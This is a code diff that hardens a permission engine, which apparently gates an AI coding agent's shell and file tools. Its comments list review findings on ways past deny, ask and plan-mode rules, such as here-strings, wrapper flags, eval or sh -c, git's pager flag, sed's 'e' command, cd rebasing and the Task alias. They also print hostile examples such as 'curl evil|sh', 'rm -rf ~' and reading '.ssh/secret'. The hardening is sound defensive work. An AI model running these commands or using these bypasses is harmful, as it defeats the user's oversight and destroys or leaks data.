@@ -343,8 +343,17 @@ def _skip_heredoc(command: str, start: int) -> Optional[int]:
     body's closing delimiter LINE (so the whole marker+body can be
     appended to the current segment as opaque text, never scanned for
     `;`/`&`/`|`/newline split points), or None if `start` isn't actually a
-    heredoc opener."""
+    heredoc opener.
+
+    vibes/review.md finding 1 (deny side): a HERE-STRING (`<<<`) is NOT a
+    heredoc -- there is no body, and the old code mis-parsed `<<<` as
+    `<<` + a `<`-shaped delimiter, swallowed everything after it as the
+    "body", and hid every later command on the line from segment
+    splitting (with allow `cat:*`, `cat <<< x; curl evil|sh` was allowed
+    whole). Returns None for `<<<` so the splitter keeps scanning."""
     n = len(command)
+    if command[start:start + 3] == "<<<":
+        return None
     j = start + 2
     if j < n and command[j] == "-":
         j += 1
@@ -425,6 +434,14 @@ def split_bash_segments(command: str) -> list:
             in_double = True; buf.append(c); i += 1; continue
         if c == "\\" and i + 1 < n:
             buf.append(c); buf.append(command[i + 1]); i += 2
+            continue
+        if depth == 0 and command[i:i + 3] == "<<<":
+            # finding 1: a HERE-STRING is not a heredoc -- consume all
+            # three `<` as ordinary characters so the rest of the line
+            # keeps being scanned for separators (and so a later `<` of
+            # the run can't re-enter the heredoc branch below).
+            buf.append("<<<")
+            i += 3
             continue
         if depth == 0 and command[i:i + 2] == "<<":
             end = _skip_heredoc(command, i)
@@ -564,8 +581,34 @@ def _tokenize_loose(segment: str) -> list:
         return segment.split()
 
 
+# finding 2: per-wrapper options that CONSUME a separate value token.
+# A shared set would mis-eat (`env -i rm`'s `-i` is valueless, but a
+# generic "-i takes a value" rule swallowed the `rm` itself).
+_WRAPPER_VALUE_OPTS = {
+    "timeout": {"-s", "-k", "--signal", "--kill-after"},
+    "nice": {"-n", "--adjustment"},
+    "ionice": {"-c", "-n", "--class", "--classdata"},
+    "sudo": {"-u", "-g", "-p", "-D", "-R", "--user", "--group", "--chdir",
+             "--role", "--type", "--other-user", "--close-from"},
+    "doas": {"-u"},
+    "env": {"-u", "--unset"},
+    "xargs": {"-I", "-o", "-P", "--replace", "--max-procs"},
+    "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
+}
+
+
 def strip_wrappers_and_env_for_deny(segment: str) -> str:
-    """DENY/ASK candidate normalization -- see module comment above."""
+    """DENY/ASK candidate normalization -- see module comment above.
+
+    vibes/review.md finding 2: wrapper FLAGS are stripped too. The old
+    "pop the wrapper, pop one value" loop left `nice -n 5 rm` as `5 rm`,
+    `timeout -s KILL 5 rm` as `KILL 5 rm` and `sudo -u root rm` as
+    `root rm` -- the leading positional defeats every prefix rule. After a
+    wrapper pop, its option cluster is dropped (each option, plus the
+    value token of a value-taking option per _WRAPPER_VALUE_OPTS, plus
+    timeout/nice's bare numeric duration/priority) so the REAL command
+    surfaces. This only ever ADDS deny candidates -- it can make a deny
+    rule fire sooner, never silence one."""
     tokens = _tokenize_loose(segment.strip())
     changed = True
     while changed and tokens:
@@ -576,10 +619,100 @@ def strip_wrappers_and_env_for_deny(segment: str) -> str:
             continue
         if tokens[0] in _DENY_STRIP_WRAPPERS:
             wrapper = tokens.pop(0)
-            if wrapper in _WRAPPER_TAKES_VALUE and tokens:
+            value_opts = _WRAPPER_VALUE_OPTS.get(wrapper, frozenset())
+            while tokens and tokens[0].startswith("-") and tokens[0] != "-":
+                opt = tokens.pop(0)
+                base_opt = opt.split("=", 1)[0]
+                if (opt in value_opts or base_opt in value_opts) and tokens \
+                        and "=" not in opt:
+                    tokens.pop(0)
+            if wrapper in ("timeout", "nice") and tokens \
+                    and tokens[0].lstrip("+-").replace(".", "", 1).isdigit():
                 tokens.pop(0)
             changed = True
     return " ".join(tokens)
+
+
+def _extract_group_bodies(command: str) -> list:
+    """vibes/review.md finding 2: the INNER text of every parenthesised
+    subshell `( ... )`, brace group `{ ...; }` and process substitution
+    `<(...)`. `extract_subshell_bodies` above only covers `$(...)` and
+    backticks -- a deny rule on `rm` never saw `( rm -rf x )`,
+    `{ rm x; }` or `<(rm x)` because those parentheses are grouped, not
+    command-substituted, and the group's own text was never a candidate."""
+    bodies = []
+    i, n = 0, len(command)
+    while i < n:
+        c = command[i]
+        if command[i:i + 2] == "<(":
+            i += 2
+            depth, start = 1, i
+            while i < n and depth:
+                if command[i] == "(":
+                    depth += 1
+                elif command[i] == ")":
+                    depth -= 1
+                i += 1
+            bodies.append(command[start:i - 1] if depth == 0 else command[start:i])
+            continue
+        if c == "(":
+            depth, start = 1, i + 1
+            j = i + 1
+            while j < n and depth:
+                if command[j] == "(":
+                    depth += 1
+                elif command[j] == ")":
+                    depth -= 1
+                j += 1
+            bodies.append(command[start:j - 1] if depth == 0 else command[start:j])
+            i = j
+            continue
+        if c == "{":
+            nxt = command[i + 1] if i + 1 < n else ""
+            if nxt in (" ", "\t", "\n", ";"):
+                j = command.find("}", i + 1)
+                if j != -1:
+                    bodies.append(command[i + 1:j])
+                    i = j + 1
+                    continue
+        i += 1
+    return [b for b in bodies if b.strip()]
+
+
+def _basename_first(segment: str) -> str:
+    """finding 2: `> "/bin/rm -rf /"` style candidate with the command's
+    PATH reduced to its basename, so a deny rule `Bash(rm:*)` also fires
+    on `/bin/rm`, `./scripts/rm`, `/usr/bin/env rm`... The full-path
+    segment remains a candidate too; this only ever adds another one."""
+    try:
+        tokens = _tokenize_loose(segment.strip())
+    except Exception:
+        return ""
+    if not tokens:
+        return ""
+    first = tokens[0].replace("\\", "/").rstrip("/")
+    base = first.rsplit("/", 1)[-1] if "/" in first else tokens[0]
+    if not base or base == tokens[0]:
+        return ""
+    return " ".join([base] + tokens[1:])
+
+
+def _is_opaque_reexec(command: str) -> bool:
+    """finding 2: any segment whose effective command re-executes a shell
+    (`eval`, or `sh|bash|zsh|dash|ksh -c`) -- its argument is a STRING the
+    engine cannot scan, so nothing about it can be checked against the
+    deny rules."""
+    for seg in split_bash_segments(command):
+        stripped = strip_wrappers_and_env_for_deny(seg)
+        tokens = _tokenize_loose(stripped)
+        if not tokens:
+            continue
+        head = tokens[0]
+        if head == "eval":
+            return True
+        if head in ("sh", "bash", "zsh", "dash", "ksh") and "-c" in tokens[1:2] or tokens[1:2] == ["-c"]:
+            return True
+    return False
 
 
 def _collapse_ws(s: str) -> str:
@@ -607,11 +740,15 @@ _GIT_BRANCH_UNSAFE = frozenset({
     "-u", "--set-upstream-to", "--unset-upstream", "--edit-description", "--create-reflog",
 })
 _GIT_OUTPUT_FLAG_RE = re.compile(r"^--output(=.*)?$")
+# vibes/review.md finding 5: `git grep -O<cmd>` / --open-files-in-pager run
+# an arbitrary PAGER command -- never read-only, in any mode.
+_GIT_PAGER_FLAG_RE = re.compile(r"^(?:-O|--open-files-in-pager)(?:[=].*)?$")
+_GIT_PAGER_FLAG_PREFIX = ("-O", "--open-files-in-pager")
 _FIND_UNSAFE = frozenset({"-exec", "-delete", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls"})
 _RO_GIT_BARE = frozenset({
     "diff", "log", "show", "shortlog", "reflog", "ls-remote", "status", "blame", "ls-files",
     "merge-base", "rev-parse", "rev-list", "describe", "cat-file", "for-each-ref",
-    "grep", "tag",
+    "grep",
 })
 
 
@@ -630,9 +767,22 @@ def _git_read_only(tokens: list) -> bool:
         # finding 12: bare `git remote` (list) or `git remote show <name>`
         # only -- add/remove/rename/set-url/prune/... all mutate.
         return not rest or rest[0] in ("-v", "--verbose", "show")
+    # vibes/review.md finding 5: `branch`/`tag` are read-only ONLY in
+    # their LIST forms (`git branch`, `git branch -l [pattern]`,
+    # `git tag -l ...`). The old "no unsafe flag" test still allowed
+    # `git branch <name>` (CREATES a branch) and `git tag -d <tag>`
+    # (DELETES one).
     if sub == "branch":
-        return not any(t in _GIT_BRANCH_UNSAFE for t in rest)
+        return not rest or rest[0] in ("-l", "--list")
+    if sub == "tag":
+        return not rest or rest[0] in ("-l", "--list")
     if sub in _RO_GIT_BARE:
+        if any(_GIT_PAGER_FLAG_RE.match(t) for t in rest):
+            return False
+        # finding 5: `-O<cmd>` also arrives glued to its value (`-Oless`,
+        # `-O"touch /tmp/pwn"`) after shlex -- catch the prefix form too.
+        if any(t.startswith(_GIT_PAGER_FLAG_PREFIX) for t in rest):
+            return False
         return not any(_GIT_OUTPUT_FLAG_RE.match(t) for t in rest)
     return False
 
@@ -739,13 +889,36 @@ def bash_deny_or_ask_matches(command: str, rules: list) -> Optional["Rule"]:
     whitespace-collapsed (a double space must not defeat a prefix match),
     and the wrapper/env-stripped candidate uses the DENY-only stripper
     (strips every `NAME=value`, no keep-list, and sudo/doas/env too --
-    never the ALLOW-only `strip_wrappers_and_env`)."""
+    never the ALLOW-only `strip_wrappers_and_env`).
+
+    vibes/review.md finding 2: also checked now -- every GROUP body
+    (`( ... )`, `{ ...; }`, `<( ... )`), the basename-first form of every
+    segment (`/bin/rm` -> `rm`), and the flag-stripped wrapper form (see
+    strip_wrappers_and_env_for_deny). All of these only ADD candidates:
+    a deny rule can fire sooner, never be silenced."""
     candidates = [_collapse_ws(command)]
     for seg in split_bash_segments(command):
         candidates.append(_collapse_ws(seg))
         candidates.append(strip_wrappers_and_env_for_deny(seg))
-    for body in extract_subshell_bodies(command):
+        b = _basename_first(seg)
+        if b:
+            candidates.append(_collapse_ws(b))
+    for body in extract_subshell_bodies(command) + _extract_group_bodies(command):
         candidates.append(_collapse_ws(body))
+        stripped = strip_wrappers_and_env_for_deny(body)
+        if stripped and stripped != body:
+            candidates.append(_collapse_ws(stripped))
+        b = _basename_first(body)
+        if b:
+            candidates.append(_collapse_ws(b))
+        # finding 2 (follow-up): a body is a whole mini-command --
+        # `$(true; rm x)`'s body "true; rm x" needs its own segment split
+        # before a prefix rule on `rm` can see the `rm x` inside it.
+        for sub_seg in split_bash_segments(body):
+            candidates.append(_collapse_ws(sub_seg))
+            sub_stripped = strip_wrappers_and_env_for_deny(sub_seg)
+            if sub_stripped and sub_stripped != sub_seg:
+                candidates.append(_collapse_ws(sub_stripped))
     for cand in candidates:
         for rule in rules:
             if rule.kind not in ("exact", "prefix", "glob"):
@@ -927,7 +1100,10 @@ def build_rule_text(tool: str, content: str) -> str:
     return f"{tool}({_escape_rule_content(content)})"
 
 
-_EDIT_LIKE_BASH_CMDS = frozenset({"mkdir", "touch", "rm", "rmdir", "mv", "cp", "sed"})
+# vibes/review.md finding 6: `sed` dropped entirely -- its `e` command
+# runs a shell command (`sed -n "1e touch /tmp/pwn" f` was auto-allowed in
+# acceptEdits), and no flag-level allowlist can prove a sed script inert.
+_EDIT_LIKE_BASH_CMDS = frozenset({"mkdir", "touch", "rm", "rmdir", "mv", "cp"})
 _MULTI_WORD_VERBS = frozenset({"git", "npm", "npx", "pnpm", "yarn", "uv", "pip", "python",
                                 "cargo", "go", "make", "docker", "gh", "kubectl", "dotnet"})
 
@@ -973,8 +1149,15 @@ _MODE_TABLE = {
 def bare_deny_tool_names(deny_rules: list) -> set:
     """Bare tool names (kind == "bare") among DENY rules / --disallowedTools
     -- these remove the tool from the session's catalog entirely, for the
-    whole session, rather than being consulted per call [D-CFG]."""
-    return {r.tool for r in deny_rules if r.kind == "bare"}
+    whole session, rather than being consulted per call [D-CFG].
+
+    vibes/review.md finding 8: an `Agent` bare-deny also removes `Task`
+    (its registered alias -- the same tool under the other name; the
+    alias used to survive the removal entirely)."""
+    names = {r.tool for r in deny_rules if r.kind == "bare"}
+    if "Agent" in names:
+        names.add("Task")
+    return names
 
 
 def _mcp_server_matches(pattern: str, server: str) -> bool:
@@ -1352,6 +1535,40 @@ class PermissionEngine:
     # WHOLE allow-rule list, not any one rule in isolation, so it can never
     # be answered by _match_any's one-rule-at-a-time loop. -----------------
 
+    _BASH_FILE_READERS = frozenset({
+        "cat", "head", "tail", "less", "more", "strings", "od", "hexdump", "xxd", "nl",
+        "tac", "rev", "zcat", "bzcat", "xzcat", "file", "stat", "wc", "md5sum", "sha256sum",
+    })
+
+    def _bash_read_deny_hit(self, command: str, action: str = "deny") -> Optional[Rule]:
+        """vibes/review.md finding 10: a Read deny/ask PATH rule also gates
+        Bash file-reader commands. For every segment whose effective
+        command is a reader, every non-option argument is resolved against
+        the live cwd (finding 7) and tested against the Read path rules --
+        one hit fires. Nothing happens when no Read path rule exists (the
+        overwhelmingly common case -- zero added friction)."""
+        rules = self.deny_rules if action == "deny" else self.ask_rules
+        read_path_rules = [r for r in rules if r.kind == "path" and r.tool == "Read"]
+        if not read_path_rules:
+            return None
+        live_cwd = self._bash_live_cwd(command)
+        if live_cwd is None:
+            live_cwd = self.cwd
+        for seg in split_bash_segments(command):
+            stripped = strip_wrappers_and_env_for_deny(seg)
+            tokens = _tokenize_loose(stripped)
+            if not tokens or tokens[0] not in self._BASH_FILE_READERS:
+                continue
+            for tok in tokens[1:]:
+                if tok.startswith("-") or any(ch in tok for ch in "<>{}*?$`"):
+                    continue
+                candidate = Path(tok)
+                target = candidate if candidate.is_absolute() else (live_cwd / candidate)
+                hit = self._path_rule_hit(rules, "Read", {"file_path": str(target)}, None, action=action)
+                if hit is not None:
+                    return hit
+        return None
+
     def _decide_bash(self, tool_input: dict) -> Decision:
         command = tool_input.get("command", "")
         bash_rules = lambda rs: [r for r in rs if r.tool == "Bash"]  # noqa: E731
@@ -1362,6 +1579,15 @@ class PermissionEngine:
         hit = bash_deny_or_ask_matches(command, [r for r in bash_rules(self.deny_rules) if r.kind in ("exact", "prefix", "glob")])
         if hit is not None:
             return Decision("deny", f"denied by rule {hit.raw!r}", source=hit.source, matched_rule=hit)
+        # vibes/review.md finding 10 (Bash half): a Read DENY path rule
+        # also gates Bash file-READER commands -- `Read(.env)` denied means
+        # `cat .env` must not sail through on the same file. Judged against
+        # the LIVE cwd (finding 7) so `cd ~; cat .ssh/secret` can't rebase
+        # its way past it.
+        read_deny = self._bash_read_deny_hit(command)
+        if read_deny is not None:
+            return Decision("deny", f"denied by rule {read_deny.raw!r} (a Bash file-reader reaching a Read-denied path)",
+                            source=read_deny.source, matched_rule=read_deny)
 
         if self.mode != "bypassPermissions":
             ask_bare = [r for r in bash_rules(self.ask_rules) if r.kind == "bare"]
@@ -1370,6 +1596,22 @@ class PermissionEngine:
             hit = bash_deny_or_ask_matches(command, [r for r in bash_rules(self.ask_rules) if r.kind in ("exact", "prefix", "glob")])
             if hit is not None:
                 return self._resolve_ask("Bash", tool_input, None, hit)
+            # vibes/review.md finding 2: `eval`/`sh -c`/`bash -c` re-execute
+            # a string this engine cannot scan. When ANY Bash deny/ask rule
+            # exists (the user expressed a contract the matcher must hold),
+            # an opaque re-exec is asked about -- in auto mode with NO such
+            # rules nothing changes (still allowed, no new friction).
+            if deny_bare or bash_rules(self.deny_rules) or bash_rules(self.ask_rules) or ask_bare:
+                if _is_opaque_reexec(command):
+                    return self._resolve_ask(
+                        "Bash", tool_input, None,
+                        Rule(tool="Bash", kind="exact", value="<opaque re-exec>",
+                             raw="Bash(eval|sh -c|bash -c) -- opaque to the deny matcher"))
+            # finding 10 (ask half): Read ASK path rules get the same Bash
+            # reader treatment as deny ones.
+            read_ask = self._bash_read_deny_hit(command, action="ask")
+            if read_ask is not None:
+                return self._resolve_ask("Bash", tool_input, None, read_ask)
 
         if self.mode in ("auto", "bypassPermissions"):
             return Decision("allow", "mode allows (no deny/ask rule matched)", source="mode")
@@ -1377,6 +1619,13 @@ class PermissionEngine:
         allow_bare = [r for r in bash_rules(self.allow_rules) if r.kind == "bare"]
         allow_patterned = [r for r in bash_rules(self.allow_rules) if r.kind in ("exact", "prefix", "glob")]
         if allow_bare or bash_allow_matches(command, allow_patterned):
+            # vibes/review.md finding 9: plan mode's write ban runs BEFORE
+            # allow rules -- an allow rule for `Bash(npm:*)` must not let
+            # `npm install` write in plan mode (the mode table alone was
+            # consulted too late, after the allow hit).
+            if self.mode == "plan" and not _bash_command_all_segments_readonly(command):
+                return Decision("deny", "plan mode: this Bash command is not read-only "
+                                "(an allow rule cannot lift the plan-mode write ban)", source="mode")
             return Decision("allow", "allowed by an explicit Bash rule", source="rules")
 
         return self._mode_table_decision("Bash", tool_input, None)
@@ -1463,19 +1712,87 @@ class PermissionEngine:
             return "edit_write_in_workdir" if (target is not None and self._in_working_dirs(target)) else "other"
         return "other"
 
+    def _bash_live_cwd(self, command: str) -> "Optional[Path]":
+        """vibes/review.md finding 7: the shell's LIVE working directory
+        after `command`'s own `cd` segments, starting from this engine's
+        cwd. `cd ~` then `rm -rf .ssh` used to be judged against
+        `<project>/.ssh` (auto-allowed in acceptEdits) while actually
+        deleting `~/.ssh`. None means "cannot be determined confidently"
+        (`cd $VAR`, an unreadable target) -- callers must treat that as
+        OUTSIDE the working dirs, never as the project cwd."""
+        cwd = self.cwd
+        for seg in split_bash_segments(command):
+            try:
+                tokens = shlex.split(seg, posix=True)
+            except ValueError:
+                return None
+            while tokens and _ENV_ASSIGN_RE.match(tokens[0]):
+                tokens.pop(0)
+            if not tokens or tokens[0] != "cd" or len(tokens) < 2:
+                continue
+            dest = tokens[1]
+            if dest.startswith("$") or "`" in dest or '"' in dest or "'" in dest:
+                return None
+            if dest == "..":
+                cwd = cwd.parent
+                continue
+            if dest == "-":
+                return None  # previous dir -- unknowable here
+            if dest.startswith("~"):
+                rest = dest[1:].lstrip("/\\")
+                cwd = (Path.home() / rest) if rest else Path.home()
+                continue
+            candidate = Path(dest)
+            cwd = candidate if candidate.is_absolute() else (cwd / candidate)
+        try:
+            return cwd.resolve()
+        except OSError:
+            return cwd
+
     def _bash_is_edit_like_in_workdir(self, command: str) -> bool:
         segments = split_bash_segments(command)
         if not segments:
             return False
+        # finding 7: judge every segment against the cwd IN EFFECT AT THAT
+        # POINT (a leading `cd ~` re-bases every later relative path -- the
+        # review's repro auto-allowed `rm -rf .ssh` in acceptEdits while it
+        # deleted ~/.ssh). Unknown destinations (cd $VAR, cd -) fail the
+        # whole check -- outside, never silently the project cwd.
+        cur = self.cwd
         for seg in segments:
             try:
                 tokens = shlex.split(seg, posix=True)
             except ValueError:
                 return False
-            if not tokens or tokens[0] not in _EDIT_LIKE_BASH_CMDS:
+            if not tokens:
                 return False
+            if tokens[0] == "cd":
+                if len(tokens) < 2:
+                    continue
+                dest = tokens[1]
+                if dest.startswith("$") or "`" in dest or dest == "-":
+                    return False
+                if dest.startswith("~"):
+                    rest = dest[1:].lstrip("/\\")
+                    cur = (Path.home() / rest) if rest else Path.home()
+                elif dest == "..":
+                    cur = cur.parent
+                else:
+                    cand = Path(dest)
+                    cur = cand if cand.is_absolute() else (cur / cand)
+                continue
+            if tokens[0] not in _EDIT_LIKE_BASH_CMDS:
+                return False
+            live_cwd = cur
             for tok in tokens[1:]:
                 if tok.startswith("-"):
+                    # finding 6: a `--opt=value` whose value carries a path
+                    # separator or `~` can retarget the write
+                    # (`cp a --target-directory=/etc`) -- not inert.
+                    if "=" in tok:
+                        _opt, _val = tok.split("=", 1)
+                        if "/" in _val or "\\" in _val or _val.startswith("~"):
+                            return False
                     continue
                 # finding 12: `~`, `$HOME`, `$(...)`, backticks -- NEVER
                 # resolved as an ordinary cwd-relative path string; a shell
@@ -1485,8 +1802,14 @@ class PermissionEngine:
                 # (verified exploit: `rm -rf ~`, `rm -rf $HOME/.ssh`).
                 if tok.startswith("~") or tok.startswith("$") or "$(" in tok or "`" in tok:
                     return False
+                # finding 6: redirects (`>~/.bashrc`, `>>x`, `<y`) and
+                # glob/brace characters (`rm -rf {..,x}` expands past the
+                # workdir) -- a shell expands all of these; none of them is
+                # a literal path this check can vouch for.
+                if any(ch in tok for ch in "<>{}*?"):
+                    return False
                 candidate = Path(tok)
-                target = candidate if candidate.is_absolute() else (self.cwd / candidate)
+                target = candidate if candidate.is_absolute() else (live_cwd / candidate)
                 if not self._in_working_dirs(target):
                     return False
         return True
@@ -1611,7 +1934,25 @@ class PermissionEngine:
             }
         return decision
 
+    # vibes/review.md finding 9: tools whose plan-mode ban must run BEFORE
+    # allow rules (the mode table's plan-column deny was consulted too
+    # late -- an allow rule for Edit let writes through in plan mode).
+    # Deliberately excludes the no-side-effect tools the mode table itself
+    # always allows (Agent/Task/TodoWrite/ToolSearch/AskUserQuestion/
+    # EnterPlanMode) and Read/Glob/Grep (plan mode allows reads).
+    _PLAN_BAN_EXEMPT = frozenset({
+        "Agent", "Task", "TodoWrite", "ToolSearch", "AskUserQuestion", "EnterPlanMode",
+        "Read", "Glob", "Grep", "ExitPlanMode",
+    })
+
     def _decide(self, tool_name: str, tool_input: dict, tool) -> Decision:
+        # vibes/review.md finding 8: `Task` is Claude Code's historical
+        # alias for the SAME tool -- canonicalized up front so every rule
+        # (deny/ask/allow, bare/agent-kind, catalog removal) written
+        # against `Agent` also governs `Task` (the alias used to escape
+        # them all).
+        if tool_name == "Task":
+            tool_name = "Agent"
         if tool_name == "Bash":
             return self._decide_bash(tool_input)
         if tool_name == "PowerShell":
@@ -1629,6 +1970,16 @@ class PermissionEngine:
                 hit = self._match_any(self.ask_rules, tool_name, tool_input, tool, action="ask")
             if hit is not None:
                 return self._resolve_ask(tool_name, tool_input, tool, hit)
+
+        # finding 9: the plan-mode write ban, BEFORE allow rules -- an
+        # allow rule must never lift what plan mode exists to enforce.
+        # (MCP tools are included: their mode-table row is "other" ->
+        # plan: deny, and an allow rule must not pre-empt that either.)
+        if self.mode == "plan" and tool_name not in self._PLAN_BAN_EXEMPT:
+            category = self._categorize(tool_name, tool_input, tool)
+            if category in ("edit_write_in_workdir", "other"):
+                return Decision("deny", f"plan mode: {category} is banned (an allow rule "
+                                "cannot lift the plan-mode write ban)", source="mode")
 
         if self.mode in ("auto", "bypassPermissions"):
             return Decision("allow", "mode allows (no deny/ask rule matched)", source="mode")
